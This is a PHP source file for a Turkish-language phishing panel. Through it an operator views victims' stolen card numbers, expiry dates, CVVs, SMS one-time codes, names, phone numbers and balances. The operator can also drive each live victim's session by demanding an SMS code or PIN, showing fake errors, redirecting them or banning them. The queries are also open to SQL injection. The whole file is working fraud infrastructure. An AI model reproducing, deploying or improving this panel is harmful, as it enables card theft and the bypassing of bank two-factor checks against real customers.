<?php

date_default_timezone_set('Europe/Istanbul');
include("../baglan.php");
$sorgula = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
session_start();
if(!isset($_SESSION["login"])){
header('Location:login.php');
}else{
if(isset($_GET['limit'])){
$limit = $_GET['limit'];
$db->query("insert into max (max) values ( '$limit')");
echo "<script>alert('Limit istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['pin'])){
$pin = $_GET['pin'];
$db->query("insert into pin (pin) values ( '$pin')");
echo "<script>alert('Pin istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['sms'])){
$sms = $_GET['sms'];
$db->query("insert into sms (sms) values ( '$sms')");
echo "<script>alert('SMS istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['hata'])){
$hata = $_GET['hata'];
$db->query("insert into hata (hata) values ( '$hata')");
echo "<script>alert('Hata verildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['hatalisms'])){
$hatalisms = $_GET['hatalisms'];
$db->query("insert into sms2 (sms2) values ( '$hatalisms')");
echo "<script>alert('Hatalı SMS istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['tebrik'])){
$tebrik = $_GET['tebrik'];
$db->query("insert into tebrik (tebrik) values ( '$tebrik')");
echo "<script>alert('Tebkriklendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['tumu'])){
$tumu = $_GET['tumu'];
$db->query("truncate table sazan");
$db->query("truncate table hata");
$db->query("truncate table sms2");
$db->query("truncate table pin");
$db->query("truncate table max");
$db->query("truncate table tebrik");
$db->query("truncate table sms");
echo "<script>alert('Tüm veriler temizlendi & sıfırlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['bankaldir'])){
$db->query("truncate table ban");
echo "<script>alert('Tüm banlar kaldırıldı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['logout'])){
session_start();
ob_start();
session_unset();
session_destroy();
header('Location:index.php');
}
if(isset($_GET['sil'])){
$sil = $_GET['sil'];
$db->query("DELETE FROM sazan WHERE ip='$sil'");
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['ban'])){
$ban = $_GET['ban'];
$db->query("insert into ban (ban) values ( '$ban')");
echo "<script>alert('Sazan banlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['ban'])){
$ban = $_GET['ban'];
$db->query("insert into ban (ban) values ( '$ban')");
echo "<script>alert('Sazan banlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['priv'])){
$priv = $_GET['priv'];
$db->query("insert into priv (priv) values ( '$priv')");
echo "<script>alert('Kullanıcı Özel sayfanıza yönlendirildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['dondur'])){
$dondur = $_GET['dondur'];
$db->query("insert into back (back) values ( '$dondur')");
echo "<script>alert('Kullanıcı Sayfanın başına gönderildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['refresh'])){
$refresh = $_GET['refresh'];
$db->query("UPDATE site SET refresh = '$refresh' WHERE id = '1'");
echo "<script>alert('Yenilenme süresi ayarlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['go'])){
$go = $_GET['go'];
$go_ip = $_GET['go_ip'];
$db->query("UPDATE sazan SET go = '{$go}' WHERE ip = '{$go_ip}'");
echo "<script>alert('Kullanıcı belirttiğiniz sayfaya yönlendirildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['oto'])){
$oto = $_GET['oto'];
$db->query("UPDATE site SET 3d = '1'");
echo "<script>alert('3D AÇILDI');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['noto'])){
$noto = $_GET['noto'];
$db->query("UPDATE site SET 3d = '0'");
echo "<script>alert('3D KAPATILDI');</script>";
echo "<script>window.location.href='index.php';</script>";
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css?family=Hind+Madurai&display=swap" rel="stylesheet">
    <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
	<title>Vırevle Panel</title>
    <link rel="icon" type="image/png" href="../files/ico.png">
    <link type="text/css" rel="stylesheet" href="./css/fatal.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="<?= $sorgula['refresh'] ?>;index.php"><!-- <?= $sorgula['refresh'] ?> sn. -->
	<style>
	.table {
		margin-bottom: 0px;
	}
	</style>
</head>
<body>

<h2 style="text-align:left;color:#292929;"><img src="../files/fatal.png" alt="FATAL" width="21px">
 Panel(R-O-O-T)&nbsp;<small style="font-size:15px;">
 <?php
 $onlineList = [];
   $query = $db->query("SELECT * FROM ips", PDO::FETCH_ASSOC);
   if($query->rowCount()) {
	   foreach($query as $v) {
		   if($v['lastOnline'] > time()) {
			   array_push($onlineList, $v['ipAddress']);
		   }
	   }
   }
   echo 'Online: '.count($onlineList);
    $sqla=$db->query('SELECT * FROM sazan ORDER BY id DESC');
  ?>
 </small><?php foreach($db->query('select * from sazan') as $sazan){
    if($sazan['sound']=='1'){
        ?>
<audio id="audioplayer" autoplay=true>
			<source src="css/fatal.mp3" type="audio/mpeg">
</audio>
   <?php
   $db->query("Update sazan set sound='0'");
    }
} ?><span style="float:right;"> <a href="?tumu=1"><button class="button2">&nbsp;<i class="fa fa-trash-alt"></i> Tümünü Sil&nbsp;</button></a> <a href="?bankaldir=1"><button class="button2">&nbsp;<i class="fa fa-asterisk"></i> Banları Kaldır&nbsp;</button></a> <a href="priv.php?sifre"><button class="button2">&nbsp;<i class="fa fa-cog"></i> Şifre Degiştir&nbsp;</button></a> <a href="?logout"><button class="button2">&nbsp;<i class="fa fa-sign-out-alt"></i> Çıkış Yap&nbsp;</button></a></span></h2>

	<table class="table">
      <thead>
        <tr>
          <th>DURUM</th>
          <th>İD</th>
          <th>İSTKART</th>
		  <th>TELEFON NO</th>	
		  <th>TL</th>	
		  <th>AD SOYAD</th>	 
          <th>CC NO</th>
		  <th>SKT</th>
		  <th>CVV</th> 
		 <th>SMS</th>
		 <th>SMS2</th>
		  <th>TARİH</th>
		  <th>IP</th>
		  <th>TALEP ET</th>
        </tr>
      </thead>
      <tbody>
		<?php
		
		foreach($sqla as $oku)
		{
$formatBin = str_replace(' ','',$oku['kk']);
       $BIN = substr($formatBin,0,6);
		?>
        <tr>
          <td style="color:#b33;"><b><?php echo $oku['now']; ?></b></td>
          <td style="color:#b33;"><b><?php echo $oku['id']; ?></b></td>
          <td style="color:#b33;"><b><?php echo $oku['info']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['phone']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['money']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['ad']; ?></b></td>
          <td style="color:#333" onclick="copy(this)"><b><?php echo $oku['kk']; ?></b></td>
		  <td style="color:#333" onclick="copy(this)"><b><?php echo $oku['sonkul']; ?></b></td>>
		  <td style="color:#333" onclick="copy(this)"><b><?php echo $oku['cvv']; ?></b></td>
		  <td style="color:#333" onclick="copy(this)"><b><?php echo $oku['sms']; ?></b></td>
		  <td style="color:#333" onclick="copy(this)"><b><?php echo $oku['bozsms']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['date']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['ip']; ?> <?=($oku['lastOnline'] > time() ? '(Aktif <i style="color: yellow !important" class="fas fa-circle"></i>)' : '(Çevrimdışı <i style="color: red !important" class="fas fa-circle"></i>)')?></b></td>
            <td style="padding:1px;color:#333"><a href="bin.php?BIN=<?=$BIN?>"><button>BİN CHECK</button></a><a href="?dondur=<?php echo $oku['ip']; ?>"><button>BAŞA DÖNDÜR</button></a><a href="?sms=<?php echo $oku['ip']; ?>"><button>SMS İSTE</button></a><br><a href="?hatalisms=<?php echo $oku['ip']; ?>"><button>HATALI SMS</button></a> <a href="?tebrik=<?php echo $oku['ip']; ?>"><button>TEBRIKLE</button></a> <a href="?hata=<?php echo $oku['ip']; ?>"><button>HATA VER</button></a> <a href="?ban=<?php echo $oku['ip']; ?>"><button><i class="fa fa-ban"></i></button></a> <a href="?sil=<?php echo $oku['ip']; ?>"><button><i class="fa fa-trash"></i></button></a><br> 
        </tr>
          </form><?php } ?>
      </tbody>
    </table>
        <form><div class="icerik">
  <div class="ustKisim">&nbsp; Otomatik Yenileme <input name="refresh" value="<?= $sorgula['refresh'] ?>" type="text" style="width:15px;height:13px;padding:5px;outline-color:#32a4a8; border:1px solid #ddd;border-radius: 2px;"/> sn. <a><button style="background:#fff">Okey</button></a></div>
</div></form>
<script>
function copy(that){
var inp =document.createElement('input');
document.body.appendChild(inp)
inp.value =that.textContent
inp.select();
document.execCommand('copy',false);
inp.remove();
}
</script>

</body>
</html>
<?php } ?>